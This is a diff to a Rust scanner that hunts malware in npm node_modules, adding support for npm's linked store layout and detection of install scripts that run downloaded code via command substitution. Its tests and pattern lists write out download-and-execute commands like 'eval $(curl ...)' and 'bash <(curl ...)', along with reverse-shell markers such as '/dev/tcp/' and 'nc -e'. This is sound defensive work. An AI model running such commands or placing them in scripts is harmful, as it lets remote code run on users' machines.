@@ -352,10 +352,20 @@ impl Scanner {
     /// Walks the packages in a `node_modules` directory.
     fn node_modules(&mut self, dir: &Path, depth: usize) {
         for (name, path) in subdirs(dir) {
-            if name == ".pnpm" || name == ".bun" {
-                // pnpm and Bun stores: `.pnpm/<name>@<version>/node_modules/<package>`
-                for (_, store_entry) in subdirs(&path) {
-                    self.node_modules(&store_entry.join("node_modules"), depth);
+            if name == ".pnpm" || name == ".bun" || name == ".store" {
+                // pnpm, Bun and npm `install-strategy=linked` stores:
+                // `.pnpm/<name>@<version>/node_modules/<package>`; the packages
+                // in place are links into the store, which are not followed.
+                for (entry, store_entry) in subdirs(&path) {
+                    if entry.starts_with('@') {
+                        // npm keeps scoped packages one level down:
+                        // `.store/@scope/<name>@<version>-<hash>/node_modules/…`
+                        for (_, scoped_entry) in subdirs(&store_entry) {
+                            self.node_modules(&scoped_entry.join("node_modules"), depth);
+                        }
+                    } else {
+                        self.node_modules(&store_entry.join("node_modules"), depth);
+                    }
                 }
             } else if name.starts_with('.') {
                 // `.bin`, `.cache`, `.package-lock.json`, etc.
@@ -500,7 +510,8 @@ fn script_suspicion(script: &str) -> Option<&'static str> {
     let has = |patterns: &[&str]| patterns.iter().any(|pattern| lower.contains(pattern));
 
     let downloads = has(&["curl ", "wget "]);
-    if downloads && has(&["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]) {
+    let piped = downloads && has(&["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]);
+    if piped || runs_substituted_download(&lower) {
         return Some("directly executes a script it downloads");
     }
     if has(&["/dev/tcp/", "nc -e ", "ncat -e "]) {
@@ -535,6 +546,38 @@ fn script_suspicion(script: &str) -> Option<&'static str> {
         return Some("runs a system command via osascript");
     }
     None
+}
+
+/// Does a command run what it downloads through command substitution, like
+/// `curl … | sh` without the pipe? `sh -c "$(curl …)"`, `eval "$(curl …)"`,
+/// `node -e "$(curl …)"`, `bash <(curl …)`, or a script that is nothing but
+/// `$(curl …)`. Keeping the output in a variable (`ip=$(curl …)`) does not
+/// count. Also used for launch items (`checks::persistence`).
+pub(crate) fn runs_substituted_download(text: &str) -> bool {
+    // What may stand right before the download for its output to be run
+    // (`sh <(` also matches `bash <(` and `zsh <(`).
+    // Single quotes do not stop it: `bash -c '$(curl …)'` hands the
+    // substitution to the inner shell, which runs it.
+    const RUNNERS: [&str; 12] = [
+        "eval \"$(",
+        "eval '$(",
+        "eval $(",
+        "-c \"$(",
+        "-c '$(",
+        "-c $(",
+        "-e \"$(",
+        "-e '$(",
+        "-e $(",
+        "sh <(",
+        "source <(",
+        ". <(",
+    ];
+    let script = text.trim().trim_start_matches(['"', '\'']);
+    ["curl ", "wget "].iter().any(|tool| {
+        script.starts_with(&format!("$({tool}"))
+            || script.starts_with(&format!("`{tool}"))
+            || RUNNERS.iter().any(|runner| text.contains(&format!("{runner}{tool}")))
+    })
 }
 
 // ---- Finding the directories to scan ----
@@ -925,6 +968,8 @@ mod tests {
             "node ./scripts/postinstall.js --base64",
             "patch-package",
             "node -e \"try{require('./postinstall')}catch(e){}\"",
+            // Keeping a download's output is not running it.
+            "VERSION=$(curl -s https://example.com/latest) node install.js",
         ] {
             assert_eq!(script_suspicion(script), None, "{script}");
         }
@@ -943,6 +988,52 @@ mod tests {
         ] {
             assert!(script_suspicion(script).is_some(), "{script}");
         }
+    }
+
+    #[test]
+    fn download_run_through_substitution_is_caught() {
+        // The same as `curl … | sh`, without the pipe.
+        for script in [
+            "sh -c \"$(curl -fsSL https://example.com/i.sh)\"",
+            "bash -c \"$(wget -qO- https://example.com/i.sh)\"",
+            "bash -c '$(curl -s https://example.com/i.sh)'",
+            "eval \"$(curl -s https://example.com/env)\"",
+            "eval $(curl -s https://example.com/env)",
+            "bash <(curl -s https://example.com/i.sh)",
+            "source <(curl -s https://example.com/i.sh)",
+            "node -e \"$(curl -s https://example.com/i.js)\"",
+            "$(curl -s https://example.com/cmd)",
+            "`wget -qO- https://example.com/cmd`",
+        ] {
+            assert_eq!(
+                script_suspicion(script),
+                Some("directly executes a script it downloads"),
+                "{script}"
+            );
+        }
+    }
+
+    #[test]
+    fn npm_linked_store_is_scanned() {
+        // `npm install --install-strategy=linked`: the package lives in
+        // `node_modules/.store/<name>@<version>-<hash>/node_modules/<name>`
+        // and `node_modules/<name>` is a link to it.
+        let temp = TempDir::new("store");
+        let stored = temp.package(
+            "node_modules/.store/event-stream@3.3.6-u3FbOMqjxU0aYG6HeAmwRw/node_modules/event-stream",
+            pkg("event-stream", "3.3.6"),
+        );
+        // Scoped packages sit one level deeper in npm's store.
+        temp.package(
+            "node_modules/.store/@pkgr/core@0.2.8-gQ81yrTZYqRCqGenfQe2EA/node_modules/@pkgr/core",
+            pkg("@pkgr/core", "0.2.8"),
+        );
+        std::os::unix::fs::symlink(&stored, temp.0.join("node_modules/event-stream")).unwrap();
+
+        let scan = scan(&[temp.0.join("node_modules")]);
+        let found: Vec<&str> = scan.malware().map(|finding| finding.package.as_str()).collect();
+        assert_eq!(found, ["@pkgr/core", "event-stream"]);
+        assert_eq!(scan.packages, 2, "the link in place is not counted again");
     }
 
     #[test]
